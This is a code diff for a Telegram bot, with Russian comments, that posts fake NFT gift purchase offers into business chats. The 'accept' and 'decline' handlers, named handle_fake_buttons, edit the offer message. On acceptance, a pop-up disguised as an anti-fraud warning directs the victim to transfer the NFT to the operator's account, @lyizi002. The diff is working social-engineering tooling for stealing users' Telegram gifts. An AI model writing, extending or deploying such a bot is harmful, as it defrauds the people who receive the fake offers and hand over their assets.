@@ -52,84 +52,27 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
-# --- ТЕКСТ ИНСТРУКЦИИ (КАК ТЫ ПРОСИЛ) ---
-START_TEXT = (
-    "<b>Как начать:</b>\n"
-    "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
-    "<b>Как создать оффер:</b>\n\n"
-    "Отправь команду в деловой чат с покупателем:\n\n"
-    "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
-    "<b>Примеры:</b>\n"
-    "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
-    "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
-    "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
-    "<b>Валюты:</b> stars / gram\n"
-    "<b>Языки:</b> ru / en / ua / ar\n\n"
-    "Команду нужно отправлять через бизнес-аккаунт Telegram в чате с покупателем."
-)
-
-# --- ФУНКЦИЯ ДЛЯ ГЛАВНОГО МЕНЮ ---
-def get_main_menu():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📖 Как создать оффер?", callback_data="menu_help")],
-        [InlineKeyboardButton(text="🌐 Языки", callback_data="menu_langs"), InlineKeyboardButton(text="💰 Валюты", callback_data="menu_currencies")],
-        [InlineKeyboardButton(text="🔑 Получить доступ", callback_data="menu_access")]
-    ])
-
-# --- КОМАНДЫ /start И /menu ---
 @dp.message(CommandStart())
 @dp.message(Command("menu"))
 async def cmd_start(message: types.Message):
     global ADMIN_ID
     ADMIN_ID = message.from_user.id 
     
-    await message.answer(START_TEXT, reply_markup=get_main_menu(), parse_mode="HTML")
-
-# --- ОБРАБОТЧИКИ МЕНЮ ---
-@dp.callback_query(F.data == "menu_help")
-async def cb_menu_help(callback: types.CallbackQuery):
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(START_TEXT, reply_markup=keyboard, parse_mode="HTML")
-
-@dp.callback_query(F.data == "menu_langs")
-async def cb_menu_langs(callback: types.CallbackQuery):
     text = (
-        "<b>🌐 Доступные языки:</b>\n\n"
-        "🇷🇺 <code>ru</code> — Русский\n"
-        "🇬🇧 <code>en</code> — English\n"
-        "🇺🇦 <code>ua</code> — Українська\n"
-        "🇸🇦 <code>ar</code> — العربية (Арабский)\n\n"
-        "<i>Пример: /of ССЫЛКА 500 stars en</i>"
+        "<b>Как начать:</b>\n"
+        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
+        "<b>Как создать оффер:</b>\n"
+        "Отправь команду в деловой чат с покупателем:\n"
+        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
+        "<b>Примеры:</b>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
+        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
+        "<b>Валюты:</b> stars / gram\n"
+        "<b>Языки:</b> ru / en / ua / ar"
     )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
+    await message.answer(text, parse_mode="HTML")
 
-@dp.callback_query(F.data == "menu_currencies")
-async def cb_menu_currencies(callback: types.CallbackQuery):
-    text = (
-        "<b>💰 Доступные валюты:</b>\n\n"
-        "⭐ <code>stars</code> — Звёзды Telegram\n"
-        "💎 <code>gram</code> — Gram (TON)\n\n"
-        "<i>Пример: /of ССЫЛКА 10 gram ru</i>"
-    )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
-
-@dp.callback_query(F.data == "menu_access")
-async def cb_menu_access(callback: types.CallbackQuery):
-    user_id = callback.from_user.id
-    if user_id in active_users:
-        await callback.answer("✅ Доступ уже активен. Можно отправлять оферы.", show_alert=True)
-    else:
-        active_users.add(user_id)
-        await callback.answer("✅ Доступ выдан. Теперь можно отправлять оферы.", show_alert=True)
-
-@dp.callback_query(F.data == "menu_back")
-async def cb_menu_back(callback: types.CallbackQuery):
-    await callback.message.edit_text(START_TEXT, reply_markup=get_main_menu(), parse_mode="HTML")
-
-
-# --- КОМАНДА /ofteam ---
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     user_id = message.from_user.id
@@ -143,7 +86,6 @@ async def cmd_ofteam(message: types.Message):
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
 
-# --- ГЕНЕРАЦИЯ ОФФЕРА ---
 @dp.business_message(F.text.startswith("/of"))
 async def handle_offer_command(message: types.Message):
     business_connection_id = message.business_connection_id
@@ -201,9 +143,11 @@ async def handle_offer_command(message: types.Message):
             except: pass
         print(f"Ошибка: {e}")
 
+# --- РЕДАКТИРОВАНИЕ СООБЩЕНИЯ + ВСПЛЫВАЮЩЕЕ ОКНО ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
+    
     data_parts = callback.data.split(":")
     action, gift_slug, amount, currency, lang = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4]
     
@@ -213,35 +157,58 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     business_connection_id = callback.message.business_connection_id
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
+    alert_text = None 
+
+    if action == "accept":
+        new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
+        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/lyizi002")]
+        ])
+        
+        # ВСПЛЫВАЮЩЕЕ ОКНО С ТВОИМ ЮЗОМ
+        alert_text = (
+            "⚠️ Внимание!\n\n"
+            "Получатель в этом сервисе:\n"
+            "@lyizi002.\n\n"
+            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
+        )
+    else:
+        new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
+        new_keyboard = None
+
+    kwargs = {
+        "chat_id": callback.message.chat.id,
+        "message_id": callback.message.message_id,
+        "text": new_text,
+        "reply_markup": new_keyboard,
+        "parse_mode": "HTML",
+        "link_preview_options": LinkPreviewOptions(
+            url=link,
+            show_above_text=True,
+            prefer_large_media=True
+        )
+    }
+    
+    if business_connection_id: 
+        kwargs["business_connection_id"] = business_connection_id
+
     try:
-        if business_connection_id:
-            await bot.delete_business_messages(business_connection_id, [callback.message.message_id])
-        else:
-            await callback.message.delete()
-
-        if action == "accept":
-            new_text = msg_data["success"].format(link=link, pretty_name=pretty_name)
-            new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text=msg_data["btn_transfer"], url="https://t.me/lyizi002")]
-            ])
-        else:
-            new_text = msg_data["declined"].format(amount=amount, symbol=symbol, link=link, pretty_name=pretty_name)
-            new_keyboard = None
-
-        kwargs = {
-            "chat_id": callback.message.chat.id, 
-            "text": new_text, 
-            "reply_markup": new_keyboard, 
-            "parse_mode": "HTML",
-            "link_preview_options": LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
-        }
+        await bot.edit_message_text(**kwargs)
         
-        if business_connection_id: kwargs["business_connection_id"] = business_connection_id
-        
-        await bot.send_message(**kwargs)
-        await callback.answer()
+        if alert_text:
+            await callback.answer(alert_text, show_alert=True)
+        else:
+            await callback.answer()
+
+    except TelegramBadRequest as e:
+        error_msg = str(e).lower()
+        if "message is not modified" in error_msg:
+            await callback.answer("Сообщение уже обработано.", show_alert=True)
+        else:
+            print(f"Ошибка редактирования: {e}")
+            await callback.answer("Не удалось изменить сообщение.", show_alert=True)
     except Exception as e:
-        print(f"Ошибка кнопки: {e}")
+        print(f"Неизвестная ошибка: {e}")
         await callback.answer("Ошибка", show_alert=True)
 
 async def main():
